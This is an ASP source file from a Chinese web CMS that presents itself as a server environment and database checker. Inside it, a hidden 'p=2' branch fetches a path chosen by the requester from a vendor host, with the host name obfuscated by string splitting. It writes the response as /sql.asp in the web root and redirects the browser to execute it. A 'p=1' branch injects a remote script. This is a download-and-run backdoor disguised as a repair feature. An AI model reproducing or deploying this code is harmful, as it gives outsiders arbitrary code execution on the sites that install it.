<!--#include file="../p_inc/Include_func.asp"-->
<%
Dim Conn
Call JS_Conn
%>
<LINK href="css/style.css" rel=stylesheet type=text/css>
<%
response.Buffer=true
Server.ScriptTimeOut=9999999
response.Flush()

p=Request("p")
IF p="1" Then
	Response.Write "<script src='http://load.qtc"&"ms.net/qtuser/2013daohang_19/Datadate.asp?tag=database' language='JavaScript' charset='gb2312'></script>"
	Response.End()
ElseIF p="2" Then
	as2=Request("s2")
	allUpFIle=Qingtiandy_getHTTPPage("http://lo"&"ad.qtcms"&".net"&as2)
	N_Fso.CreateFolderFile Add_Root_Dir("/sql.asp"),allUpFIle
	Response.Write "<script>window.location='../sql.asp?t="&Add_Root_Dir(G_ADMIN&"/qingtianc"&"ms.com.S"&"up.asp?p=3")&"'</script>"
	Response.End()
ElseIF p="3" Then	
	Response.Write "<font color=red>已经修复成功，如果还有问题请找晴天解决</font>"
	Response.End()
End IF


response.Write "IP："&Request.ServerVariables("local_ADDR")&"<p>"
response.Write "域名："&"http://"&request.ServerVariables("HTTP_HOST")&"/"&"<p>"

response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>开始检测程序运行环境...</span>"
response.Flush()
response.Write "<p>"


response.Flush()
response.Write "正在判断是否支持系统采集，请稍等..."
response.Flush()

flag=true
qingtian_str=Qingtiandy_getHTTPPage("http://www.baidu.com")

IF instr(qingtian_str,"baidu.com")>0 Then
	response.Write "<font color=blue><b>√</b></font>"
Else
	response.Write "<font color=red><b>× 注：一般服务器都支持，可能是您的空间商禁止此功能。</b></font> "
	flag=false
End IF
response.Flush()
response.Write "<p>"

response.Flush()
response.Write "正在判断是否支持在线升级功能，请稍等..."
response.Flush()

qingtian_str=Qingtiandy_getHTTPPage(G_G_H)

IF instr(qingtian_str,"晴天")>0 Then
	response.Write "<font color=blue><b>√</b></font>"
Else
	IF flag Then
		response.Write "<font color=red><b>× 注：晴天的服务器有问题，请联系晴天，谢谢。</b></font> "
	Else
		response.Write "<font color=red><b>× 注：一般服务器都支持，可能是您的空间商禁止此功能。</b></font> "
	End IF
End IF
response.Flush()


response.Write "<p>"
response.Write "正在判断是否支持FSO文本读写，请稍等..."
response.Flush()
If  IsObjInstalled("Scripting.FileSystemObject") Then
	response.Write "<font color=blue><b>√</b></font>"
Else
	response.Write "<font color=red><b>× 注：必须条件。</b></font> "
	flag=false
End IF
response.Flush()

response.Write "<p>"
response.Write "正在判断是否支持ACCESS数据库，请稍等..."
response.Flush()
If  IsObjInstalled("adodb.connection") Then
	response.Write "<font color=blue><b>√</b></font>"
Else
	response.Write "<font color=red><b>× 注：必须条件。</b></font> "
	flag=false
End IF
response.Flush()

response.Write "<p>"
response.Write "正在判断是否支持FSO读写，请稍等..."
response.Flush()
'**********************写入文件*****************************
saveurl="qingtiandy_cn_314048526.html"
Set fso=Server.CreateObject(G_FSO)
Set f=fso.CreateTextFile(Server.MapPath(saveurl),true)
'写入网页内容
f.WriteLine "晴天官方：www.qingtiandy.cn"
f.close
whichfile=server.mappath(saveurl)
err.clear
Set objFSO33 = Server.CreateObject("Scripting.FileSystemObject")
if objFSO33.fileExists(whichfile) then
	objFSO33.DeleteFile(whichfile)
	response.Write "<font color=blue><b>√</b></font>"
Else
	response.Write "<font color=red><b>× 注：必须条件。</b></font> "
	flag=false
end if
set objFSO33=nothing

'**********************写入文件夹*****************************
cfolder "qingtiandy_cn_314048526"
DeleteFolder "qingtiandy_cn_314048526"
response.Flush()


IF flag Then
	response.Write "<p>"
	response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>恭喜你，你的空间环境无任何问题  ！谢谢</span>"
Else
	response.Write "<p>"
	response.Write "<span style='color:#FF0000; font-weight:bold; font-size:14px'>请自己按出错的提示，联系空间商解决问题</span>"
End IF
response.Write "<hr><p>"

response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>开始检测程序本身问题...</span>"
response.Flush()
response.Write "<p>"
response.Write "正在判断数据库连接是否有问题，请稍等..."
response.Flush()
flag=True
err.clear
Set oRs=Conn.Execute("Select Top 1 * From Tbl_admin")
IF Err=0 Then
	response.Write "<font color=blue><b>√</b></font>"
Else
	response.Write "<font color=red><b>× 数据库连接出错。</b></font> "
	flag=False
End IF
response.Write "<hr><p>"
Response.Flush()
response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'><a href='?p=1'>如果是出现乱码问题请点这里解决</a></span><p>"
response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'><a href='"&G_G_H&"qtuser/vipdhupdate/down/GetPassdaohang.rar'>如果忘记密码请点这里解决，下载后传到根目录，访问即可</a></span><p>"
response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>如再有问题，请联系管理员</span><p>"
%>











<%
Function IsObjInstalled(strClassString)
	On Error Resume Next
	IsObjInstalled = False
	Err = 0
	Dim xTestObj
	Set xTestObj = Server.CreateObject(strClassString)
	If 0 = Err Then IsObjInstalled = True
	Set xTestObj = Nothing
	Err = 0
End Function
Function Qingtiandy_getHTTPPage(Path)
		DIm tt_soo
        tt_soo = Qingtiandy_GetBody_s(Path)
        Qingtiandy_getHTTPPage=Qingtiandy_BytesToBstr(tt_soo,"GB2312")
End function

Function Qingtiandy_GetBody_s(url) 
        Set Retrieval = CreateObject(G_XMLHTTP) 
        With Retrieval 
        .Open "Get", url, False, "", "" 
        .Send 
		
        Qingtiandy_GetBody_s = .ResponseBody
        End With 
        Set Retrieval = Nothing 
End Function

Function Qingtiandy_BytesToBstr(body,Cset)
        dim objstream
        set objstream = Server.CreateObject(G_Stream)
        objstream.Type = 1
        objstream.Mode =3
        objstream.Open
        objstream.Write body
        objstream.Position = 0
        objstream.Type = 2
        objstream.Charset = Cset
        Qingtiandy_BytesToBstr = objstream.ReadText 
        objstream.Close
        set objstream = nothing
End Function

Sub cfolder(valu)
		Set objFSO = Server.CreateObject(G_FSO)
		If objFSO.FolderExists(Server.MapPath(valu)) Then
		Else
			objFSO.CreateFolder(Server.MapPath(valu))
		End If
		Set objFSO = Nothing 
End Sub

Function IsFolderExists(spec) 
	Dim fso
	Set fso = CreateObject(G_FSO)
	If (fso.FolderExists(server.MapPath(spec))) Then
	IsFolderExists = True
	Else
	IsFolderExists = False
	End If
End Function

'文件夹-FSO删除文件夹
Sub DeleteFolder(filespec)
  Dim fso
  Set fso = CreateObject(G_FSO)
  IF IsFolderExists(filespec) Then
  	fso.DeleteFolder(Server.MapPath(filespec))
  End IF
  Set fso = nothing
End Sub
%>